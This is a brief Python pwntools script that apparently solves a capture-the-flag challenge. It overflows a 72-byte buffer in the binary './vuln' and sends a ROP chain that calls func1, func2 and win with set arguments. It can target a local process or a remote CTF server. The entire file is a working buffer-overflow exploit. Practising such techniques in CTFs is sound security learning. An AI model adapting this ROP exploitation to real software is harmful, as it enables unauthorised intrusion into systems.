#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF('./vuln')
rop = ROP(elf)

rop.raw(cyclic(72))
rop.raw(p64(rop.ret.address))
rop.call("func1", [0xdeadbeef])
rop.call("func2", [0xcafebabe])
rop.call("win", [next(elf.search(b"magicman\x00"))])


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript="continue")

    if args.REMOTE:
        return remote("pwn.platypew.social", 30005)

    return process(elf.path)

p = start()
p.sendline(rop.chain())

p.interactive()
